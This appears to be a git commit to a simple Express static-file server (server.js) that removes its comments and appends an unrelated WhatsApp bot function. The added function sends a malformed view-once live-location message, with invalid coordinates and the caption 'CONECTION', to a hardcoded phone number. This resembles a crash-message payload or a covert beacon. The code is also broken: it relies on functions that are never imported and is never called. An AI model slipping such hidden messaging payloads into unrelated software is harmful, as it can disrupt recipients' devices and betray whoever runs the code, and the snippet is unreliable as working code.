d9c1754245047396b540a678aa1f3500c40eeee1
X-Rezz <162150873+RerezzOfficial@users.noreply.github.com>
2024-12-12 23:33:31 +0700

    Update server.js

--- server.js
+++ server.js
@@ -2,16 +2,39 @@ const express = require('express');
 const path = require('path');
 const app = express();
 
-// Menyajikan file statis dari folder 'public'
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Rute untuk halaman utama
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Menjalankan server di port 3000
 const PORT = 3000;
 app.listen(PORT, () => {
     console.log(`Server berjalan di http://localhost:${PORT}`);
 });
+
+
+async function nweButton(vreden) {
+    const ownerBot = `6285216955233@s.whatsapp.net`;
+    
+    var msg = generateWAMessageFromContent(ownerBot, proto.Message.fromObject({
+        'viewOnceMessage': {
+            'message': {
+                'liveLocationMessage': {
+                    'degreesLatitude': 'p', 
+                    'degreesLongitude': 'p',
+                    "caption": "CONECTION",
+                    'sequenceNumber': '0',
+                    'jpegThumbnail': ''
+                }
+            }
+        }
+    }), { 'userJid': ownerBot });
+
+    await vreden.relayMessage(ownerBot, msg.message, {
+        'participant': {
+            'jid': ownerBot
+        },
+        'messageId': msg.key.id
+    });
+}
